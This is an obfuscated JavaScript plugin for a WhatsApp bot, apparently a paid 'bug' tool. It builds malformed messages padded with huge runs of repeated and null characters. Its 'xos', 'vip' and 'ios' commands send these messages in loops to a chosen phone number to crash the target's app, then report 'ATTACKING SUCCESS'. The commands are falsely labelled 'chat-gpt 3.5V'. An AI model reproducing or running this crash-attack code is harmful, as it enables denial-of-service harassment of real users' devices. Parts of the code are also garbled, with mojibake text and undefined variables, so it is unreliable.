const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  downloadContentFromMessage,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  makeInMemoryStore,
  proto
} = require("@whiskeysockets/baileys");
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  fetchJson
} = require("../lib/functions");
const {
  cmd,
  commands
} = require("../command");
const sleep = _0x2b42c1 => new Promise(_0x1db49c => setTimeout(_0x1db49c, _0x2b42c1));
const {
  beta1,
  beta2,
  buk1
} = require("../lib/bug");
async (_0x59c935, _0x44dd3b, _0xfb1a29, {
  reply: _0x4da104,
  from: _0x870c90,
  q: _0x375fbe,
  l: _0x20c9b2,
  prefix: _0x1d9f4d
}) => {};
async function ngeloc(_0x20eb3c, _0x41db9f, _0x55174d) {
  var _0x482e1c = generateWAMessageFromContent(_0x41db9f, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': "SHAN BUG WHATSAPP âœ…" + "ê¦¾".repeat(0xc350),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': _0x41db9f,
    'quoted': _0x55174d
  });
  await _0x20eb3c.relayMessage(_0x41db9f, _0x482e1c.message, {
    'participant': {
      'jid': _0x41db9f
    },
    'messageId': _0x482e1c.key.id
  });
}
async function sendViewOnceMessages(_0x30d9e, _0x447b60) {
  let _0x15fe30 = generateWAMessageFromContent(_0x447b60, {
    'viewOnceMessage': {
      'message': {
        'messageContextInfo': {
          'deviceListMetadata': {},
          'deviceListMetadataVersion': 0x2
        },
        'interactiveMessage': proto.Message.InteractiveMessage.create({
          'body': proto.Message.InteractiveMessage.Body.create({
            'text': ''
          }),
          'footer': proto.Message.InteractiveMessage.Footer.create({
            'text': ''
          }),
          'header': proto.Message.InteractiveMessage.Header.create({
            'title': '',
            'subtitle': '',
            'hasMediaAttachment': false
          }),
          'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
            'buttons': [{
              'name': "cta_url",
              'buttonParamsJson': "{\"display_text\":\"Ã Â¾Â§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
            }],
            'messageParamsJson': "\0".repeat(0x186a0)
          })
        })
      }
    }
  }, {});
  _0x30d9e.relayMessage(_0x447b60, _0x15fe30.message, {
    'messageId': _0x15fe30.key.id
  });
}
async function pirgam(_0x46550e, _0x328885, _0x32cb92) {
  var _0x5930f7 = generateWAMessageFromContent(_0x328885, proto.Message.fromObject({
    'interactiveMessage': {
      'header': {
        'title': "ð’ð‡ð€ð ð‚ð‡ð‘ð€ð’ð‡",
        'hasMediaAttachment': true,
        ...(await prepareWAMessageMedia({
          'image': {
            'url': "https://telegra.ph/file/52fbfcc0fd22e01c0ab3f.jpg"
          }
        }, {
          'upload': _0x46550e.waUploadToServer
        }))
      },
      'body': {
        'text': ''
      },
      'footer': {
        'text': "â€º          #DarkShan"
      },
      'nativeFlowMessage': {
        'messageParamsJson': ''.repeat(0xf4240)
      }
    }
  }), {
    'userJid': _0x328885,
    'quoted': _0x32cb92
  });
  await _0x46550e.relayMessage(_0x328885, _0x5930f7.message, {
    'participant': {
      'jid': _0x328885
    },
    'messageId': _0x5930f7.key.id
  });
}
async function penghitaman(_0x37c2cc, _0x8b6fde) {
  var _0x2ed389 = generateWAMessageFromContent(_0x37c2cc, proto.Message.fromObject({
    'stickerMessage': {
      'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
      'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
      'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
      'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
      'mimetype': "image/webp",
      'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
      'fileLength': "10116",
      'mediaKeyTimestamp': "1715876003",
      'isAnimated': false,
      'stickerSentTs': "1715881084144",
      'isAvatar': false,
      'isAiSticker': false,
      'isLottie': false
    }
  }), {
    'userJid': _0x37c2cc,
    'quoted': _0x8b6fde
  });
  await conn.relayMessage(_0x37c2cc, _0x2ed389.message, {
    'participant': {
      'jid': _0x37c2cc
    },
    'messageId': _0x2ed389.key.id
  });
}
async function sendListMessage(_0xf6a743, _0x274e24) {
  var _0x30f076 = generateWAMessageFromContent(_0x274e24, proto.Message.fromObject({
    'listMessage': {
      'title': "DARK SHAN" + "\0".repeat(0xe09c0),
      'footerText': "Ã ÂºÂ®Ã¢â€šÂ®Ã Â½Å¾Ã Â¸Â¨VÃªâ„¢Â°Ã Â¸Â¨ Ã Â¹â€“Ã ÂºÂ¡GÃªâ„¢Â°Ã Â½â‚¬ÃÂ¡ÃÅ“Ã¢Å“â€¦Ã¢Æ’Å¸Ã¢â€¢Â®",
      'description': "Ã ÂºÂ®Ã¢â€šÂ®Ã Â½Å¾Ã Â¸Â¨VÃªâ„¢Â°Ã Â¸Â¨ Ã Â¹â€“Ã ÂºÂ¡GÃªâ„¢Â°Ã Â½â‚¬ÃÂ¡ÃÅ“Ã¢Å“â€¦Ã¢Æ’Å¸Ã¢â€¢Â®",
      'buttonText': null,
      'listType': 0x2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 0x927c0,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': 'whatsapp',
      'entryPointConversionDelaySeconds': 0x9,
      'disappearingMode': {
        'initiator': 'INITIATED_BY_ME'
      }
    },
    'selectListType': 0x2,
    'product_header_info': {
      'product_header_info_id': 0x4433e2e130,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': _0x274e24
  });
  await _0xf6a743.relayMessage(_0x274e24, _0x30f076.message, {
    'participant': {
      'jid': _0x274e24
    },
    'messageId': _0x30f076.key.id
  });
}
async function sendSystemCrashMessage(_0x1aa67f, _0xedab18) {
  var _0x2ebe4d = generateWAMessageFromContent(_0xedab18, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "ðƒð€ð‘ðŠ ð’ð‡ð€ð ðŒðƒ"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': "cta_url",
              'buttonParamsJson': "{ display_text : 'SHAN BUG WHATSAPP', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(0xf4240)
          }
        }
      }
    }
  }), {
    'userJid': _0xedab18
  });
  await _0x1aa67f.relayMessage(_0xedab18, _0x2ebe4d.message, {
    'participant': {
      'jid': _0xedab18
    },
    'messageId': _0x2ebe4d.key.id
  });
}
async function sendLiveLocationMessage(_0x3c2bcc, _0x183257) {
  var _0x1e7bf3 = generateWAMessageFromContent(_0x183257, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': "Ã˜â€šÃ™â€ Ã˜Æ’Ã˜â€žÃ™Â½Ã˜â€šÃ™â€ Ã˜Æ’Ã˜â€žÃ™Â½" + "ê¦¾".repeat(0xc350),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': _0x183257
  });
  await _0x3c2bcc.relayMessage(_0x183257, _0x1e7bf3.message, {
    'participant': {
      'jid': _0x183257
    },
    'messageId': _0x1e7bf3.key.id
  });
}
async function sendVariousMessages(_0x1c1bac, _0x2cb923) {
  for (let _0x24e776 = 0x0; _0x24e776 < _0x2cb923; _0x24e776++) {
    sendListMessage(_0x1c1bac);
    await sleep(0x5dc);
    sendLiveLocationMessage(_0x1c1bac);
    await sleep(0x7d0);
    sendSystemCrashMessage(_0x1c1bac);
    await sleep(0x1f4);
    sendSystemCrashMessage(_0x1c1bac);
    await sleep(0x1f4);
  }
}
async function sendRepeatedMessages2(_0x4483ba, _0x235ad9, _0x51d871) {
  for (let _0x3b4afc = 0x0; _0x3b4afc < _0x51d871; _0x3b4afc++) {
    sendSystemCrashMessage(_0x4483ba, _0x235ad9);
    await sleep(0x5dc);
    sendSystemCrashMessage(_0x4483ba, _0x235ad9);
    await sleep(0x7d0);
    sendSystemCrashMessage(_0x4483ba, _0x235ad9);
    await sleep(0x1f4);
    sendSystemCrashMessage(_0x4483ba, _0x235ad9);
    await sleep(0x1f4);
  }
}
const xbug2 = {
  'key': {
    'remoteJid': 'status@broadcast',
    'fromMe': false,
    'participant': "0@s.whatsapp.net"
  },
  'message': {
    'listResponseMessage': {
      'title': "DarkShan"
    }
  }
};
async function iponcrash(_0x8d0574, _0x5e3390) {
  await _0x8d0574.relayMessage(Pe, {
    'paymentInviteMessage': {
      'serviceType': "FBPAY",
      'expiryTimestamp': Date.now() + 0x6c258c00
    }
  }, {});
  sleep(0xc8);
  await _0x8d0574.relayMessage(_0x5e3390, {
    'paymentInviteMessage': {
      'serviceType': "FBPAY",
      'expiryTimestamp': Date.now() + 0x6c258c00
    }
  }, {
    'participant': {
      'jid': _0x5e3390
    }
  });
  sleep(0xc8);
  await _0x8d0574.relayMessage(Pe, {
    'paymentInviteMessage': {
      'serviceType': "FBPAY",
      'expiryTimestamp': Date.now() + 0x6c258c00
    }
  }, {});
}
async function bughomebutton(_0x19f904) {
  var _0x2d09e9 = generateWAMessageFromContent(_0x19f904, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "IYA IN"
          },
          'footer': {
            'text': "â€ºArafiBotz"
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': "cta_url",
              'buttonParamsJson': "{ display_text : 'ArafiBugWhatsApp', url : , merchant_url :  }"
            }],
            'messageParamsJson': ''.repeat(0xf4240)
          }
        }
      }
    }
  }), {
    'userJid': _0x19f904,
    'quoted': m
  });
  await conn.relayMessage(_0x19f904, _0x2d09e9.message, {
    'messageId': _0x2d09e9.key.id
  });
}
async function sendQP(_0x502bcf, _0x85c5c8, _0xe6bfa4, _0x285640, _0x18dbeb, _0x58a0e1, _0x4ee4c7, _0x13e0a2, _0x540cec) {
  var _0x5de150 = generateWAMessageFromContent(_0x85c5c8, proto.Message.fromObject({
    'qp': {
      'filter': {
        'filterName': _0xe6bfa4,
        'parameters': _0x285640,
        'filterResult': _0x18dbeb,
        'clientNotSupportedConfig': _0x58a0e1
      },
      'filterClause': {
        'clauseType': _0x4ee4c7,
        'clauses': _0x13e0a2,
        'filters': _0x540cec
      }
    }
  }), {
    'userJid': _0x85c5c8
  });
  await _0x502bcf.relayMessage(_0x85c5c8, _0x5de150.message, {
    'participant': {
      'jid': _0x85c5c8
    },
    'messageId': _0x5de150.key.id
  });
}
async function sendBugIos(_0x5936ab) {
  iponcrash(_0x5936ab);
  sleep(0x1f4);
  sendExtendedTextMessage(_0x5936ab);
}
async function sendSessionStructure(_0x17eed3, _0x5f464e, _0x5733e8, _0x2b4592, _0x970f50, _0x27b6a9, _0x2ecb25, _0x1fb02f, _0x301c1b, _0x5480cf, _0x10471c, _0x44a2a7, _0x4721d4, _0x16af54, _0xa15f6a) {
  var _0x26ff57 = generateWAMessageFromContent(_0x5f464e, proto.Message.fromObject({
    'sessionStructure': {
      'sessionVersion': _0x5733e8,
      'localIdentityPublic': _0x2b4592,
      'remoteIdentityPublic': _0x970f50,
      'rootKey': _0x27b6a9,
      'previousCounter': _0x2ecb25,
      'senderChain': _0x1fb02f,
      'receiverChains': _0x301c1b,
      'pendingKeyExchange': _0x5480cf,
      'pendingPreKey': _0x10471c,
      'remoteRegistrationId': _0x44a2a7,
      'localRegistrationId': _0x4721d4,
      'needsRefresh': _0x16af54,
      'aliceBaseKey': _0xa15f6a
    }
  }), {
    'userJid': _0x5f464e
  });
  await _0x17eed3.relayMessage(_0x5f464e, _0x26ff57.message, {
    'participant': {
      'jid': _0x5f464e
    },
    'messageId': _0x26ff57.key.id
  });
}
cmd({
  'pattern': "xos",
  'category': "bugs",
  'react': "ðŸ–•",
  'desc': "chat-gpt 3.5V",
  'filename': __filename
}, async (_0x5f22fb, _0xa77b8d, _0x3a430f, {
  reply: _0x1db236,
  from: _0xb4e5f4,
  q: _0x33a941,
  isPreUser: _0x48ffa3,
  l: _0x197ff5,
  prefix: _0x59eb04
}) => {
  try {
    if (!_0x48ffa3) {
      return _0x1db236("âš ï¸ âš ï¸ *Contact owner to Active your number To Premium user*");
    }
    if (!_0x33a941) {
      return _0x1db236("Example: " + _0x59eb04 + "ponnya 94Ã—Ã—Ã—");
    }
    const _0x51a437 = _0x33a941.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    _0x1db236("ð™‹ð™§ð™¤ð™˜ð™˜ð™šð™¨ ðŸ‘¾");
    for (let _0x5d0ed6 = 0x0; _0x5d0ed6 < 0x32; _0x5d0ed6++) {
      await sendVariousMessages(_0x5f22fb, _0x51a437, 'wanted');
      await sendQP(_0x5f22fb, _0x51a437, "wanted");
      await beta2(_0x5f22fb, _0x51a437, "wanted");
      await sendSessionStructure(_0x5f22fb, _0x51a437, "wanted");
      await beta1(_0x5f22fb, _0x51a437, "wanted");
    }
    _0x1db236("ã€Ž ATTACKING SUCCESS ã€\n\nTARGET: " + _0x51a437 + "\nSTATUS: Successfully â™»ï¸");
  } catch (_0x56ff76) {
    console.error(_0x56ff76);
    _0x1db236("ERROR");
  }
});
cmd({
  'pattern': "vip",
  'category': "bugs",
  'react': "ðŸ‘‘",
  'desc': "chat-gpt 3.5V",
  'filename': __filename
}, async (_0x202755, _0xab94f1, _0x60b68b, {
  reply: _0x306f6b,
  from: _0x486ed3,
  q: _0x2c2251,
  l: _0x5d9380,
  prefix: _0x159e12
}) => {
  try {
    const _0x4ba2d6 = await fetchJson("https://raw.githubusercontent.com/DarksadasYT12/bot/refs/heads/main/ss/pre.js");
    const _0xb50c0d = _0x4ba2d6.split(',');
    const _0xfb3575 = [..._0xb50c0d].map(_0x10d9d9 => _0x10d9d9.replace(/[^0-9]/g, '') + "@s.whatsapp.net");
    if (!_0xfb3575) {
      return _0x306f6b("âš ï¸ âš ï¸ *Contact owner to Active your number To Premium user*");
    }
    if (!_0x2c2251) {
      return _0x306f6b("Example: " + _0x159e12 + "vip 94Ã—Ã—Ã—");
    }
    const _0x459073 = _0x2c2251.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    _0x306f6b("ð™‹ð™§ð™¤ð™˜ð™˜ð™šð™¨ ðŸ‘¾");
    for (let _0x329beb = 0x0; _0x329beb < 0x1e; _0x329beb++) {
      await buk1(_0x202755, _0x459073, 'p', 0xf9060, true);
      await sendQP(_0x202755, _0x459073, 'wanted');
      await beta2(_0x202755, _0x459073, "wanted");
      await sendSessionStructure(_0x202755, _0x459073, "wanted");
      await beta1(_0x202755, _0x459073, "wanted");
    }
    _0x306f6b("ã€Ž ATTACKING SUCCESS ã€\n\nTARGET: " + _0x459073 + "\nSTATUS: Successfully â™»ï¸");
  } catch (_0x369885) {
    console.error(_0x369885);
    _0x306f6b('ERROR');
  }
});
cmd({
  'pattern': "ios",
  'category': "bugs",
  'react': "ðŸ‘¾",
  'desc': "chat-gpt 3.5V",
  'filename': __filename
}, async (_0x3bd8a1, _0x7a0ae8, _0x381dcc, {
  reply: _0x1c3d2c,
  from: _0x23e2b9,
  q: _0x7f8eb6,
  isPreUser: _0x1314b6,
  l: _0x192f71,
  prefix: _0x1c7e06
}) => {
  try {
    if (!_0x1314b6) {
      return _0x1c3d2c("âš ï¸ âš ï¸ *Contact owner to Active your number To Premium user*");
    }
    if (!_0x7f8eb6) {
      return _0x1c3d2c("Example: " + _0x1c7e06 + "ios 94Ã—Ã—Ã—");
    }
    const _0x4f46de = _0x7f8eb6.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    _0x1c3d2c("ð™‹ð™§ð™¤ð™˜ð™˜ð™šð™¨ ðŸ‘¾");
    for (let _0x27af88 = 0x0; _0x27af88 < 0x1e; _0x27af88++) {
      await buk1(_0x3bd8a1, _0x4f46de, 'p', 0xf9060, true);
      await sendQP(_0x3bd8a1, _0x4f46de, "wanted");
      await beta2(_0x3bd8a1, _0x4f46de, "wanted");
      await sendSessionStructure(_0x3bd8a1, _0x4f46de, 'wanted');
      await beta1(_0x3bd8a1, _0x4f46de, "wanted");
    }
    _0x1c3d2c("ã€Ž ATTACKING SUCCESS ã€\n\nTARGET: " + _0x4f46de + "\nSTATUS: Successfully â™»ï¸");
  } catch (_0x2e8802) {
    console.error(_0x2e8802);
    _0x1c3d2c("ERROR");
  }
});
